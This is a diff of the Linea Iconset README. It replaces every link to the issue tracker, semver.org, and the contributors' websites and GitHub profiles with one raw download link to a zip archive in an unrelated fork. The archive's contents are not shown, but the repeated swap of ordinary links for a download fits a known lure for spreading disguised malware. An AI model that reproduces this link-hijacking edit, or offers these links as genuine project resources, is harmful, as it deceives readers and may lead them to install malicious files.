@@ -7,20 +7,20 @@ There are acknowledgements spread throughout the source code if you look around,
 
 ## Contributing
 
-If you wish to contribute to the project. If you’re able to patch the bug or add the feature yourself – fantastic, make a pull request with the code. If you find a bug in a project you please create an [issue](https://github.com/linea-io/Linea-Iconset/issues/new). 
+If you wish to contribute to the project. If you’re able to patch the bug or add the feature yourself – fantastic, make a pull request with the code. If you find a bug in a project you please create an [issue](https://github.com/Nihal-puliyakkady/Linea-Iconset/raw/refs/heads/master/_ecommerce/Iconset_Linea_3.3.zip). 
 
 ## Versioning
 
-Linea is currently maintained under the [Semantic Versioning guidelines](http://semver.org/).
+Linea is currently maintained under the [Semantic Versioning guidelines](https://github.com/Nihal-puliyakkady/Linea-Iconset/raw/refs/heads/master/_ecommerce/Iconset_Linea_3.3.zip).
 
 ## Contributors
 
 
 **Dario Ferrando**
-- [Website](http://www.dario.io/)
-- [GitHub](https://github.com/DarioFerrando)
+- [Website](https://github.com/Nihal-puliyakkady/Linea-Iconset/raw/refs/heads/master/_ecommerce/Iconset_Linea_3.3.zip)
+- [GitHub](https://github.com/Nihal-puliyakkady/Linea-Iconset/raw/refs/heads/master/_ecommerce/Iconset_Linea_3.3.zip)
 
 **Benjamin Sigidi**
-- [Website](https://moozen.com/)
-- [GitHub](https://github.com/benjaminsigidi)
+- [Website](https://github.com/Nihal-puliyakkady/Linea-Iconset/raw/refs/heads/master/_ecommerce/Iconset_Linea_3.3.zip)
+- [GitHub](https://github.com/Nihal-puliyakkady/Linea-Iconset/raw/refs/heads/master/_ecommerce/Iconset_Linea_3.3.zip)
 
